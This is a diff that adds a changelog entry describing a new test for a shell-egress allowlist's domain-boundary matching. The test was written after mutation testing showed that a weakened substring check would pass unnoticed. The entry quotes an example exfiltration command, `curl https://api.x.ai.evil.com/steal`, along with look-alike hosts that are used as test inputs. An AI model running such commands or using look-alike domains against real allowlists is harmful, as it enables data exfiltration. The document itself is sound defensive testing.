@@ -1,3 +1,35 @@
+## 3.220.0 (2026-08-26)
+
+- TEST-COVERAGE (sweep #38 — a byte-identical coverage pin, NOT a behavior
+  change; the shipping enforcement line is unchanged and its sha256 is identical
+  before and after: `c6804469…`). New enforcement family this sweep: the
+  OUTBOUND shell-egress allowlist (`src/security/egress.mjs`), which controls
+  data exfiltration from shell commands — distinct from the swarm URL allowlist
+  (`ToolPolicy.canExecute`, pinned in sweep #27). In `allowlist` mode,
+  `checkShellEgress` permits a command only if EVERY host it names is on the
+  allowlist, matched at line 110 by `h === a || h.endsWith("." + a)` (exact host
+  OR a true dot-boundary subdomain).
+- The blind spot: the only allowlist test (`test/egress.test.mjs`) asserted just
+  `api.x.ai`→allow and an unrelated `evil.example`→block. It never drove the
+  domain BOUNDARY — no look-alike that contains the allowlisted host as a
+  substring, no dot-less prefix-glued host, no legitimate subdomain. So a
+  refactor that weakened line 110 to `h.includes(a)` (or dropped the dot to
+  `h.endsWith(a)`) would let `curl https://api.x.ai.evil.com/steal` exfiltrate
+  data past an `api.x.ai`-only allowlist — with the whole suite still green. This
+  is the same domain-boundary class as sweeps #33/#36, on a new (egress) axis.
+- PROVEN a blind spot: mutating line 110 to `h === a || h.includes(a)` (which
+  admits `api.x.ai.evil.com`) left the FULL suite GREEN (3631/0) — no test
+  covered the boundary. Restored byte-identical (sha256 unchanged), then the new
+  test reddens under EACH of the three boundary-weakening mutations and passes on
+  the restored code: `.includes(a)`→red on the suffix-substring case,
+  `.endsWith(a)` [no dot]→red on the prefix-glued case, `h === a` [exact only]→
+  red on the real-subdomain case. All directions verified.
+- Test: `test/egress.test.mjs` adds "allowlist host match is domain-boundary" —
+  under `allowHosts:["api.x.ai"]` it asserts `curl https://api.x.ai.evil.com/…`
+  is BLOCKED (suffix-substring exfil), `curl https://xapi.x.ai/…` is BLOCKED
+  (no-dot prefix-glued), and `curl https://sub.api.x.ai/…` is ALLOWED (real
+  subdomain). Full suite 3632/0.
+
 ## 3.219.0 (2026-08-26)
 
 - TEST-COVERAGE (sweep #37 — a byte-identical coverage pin, NOT a behavior
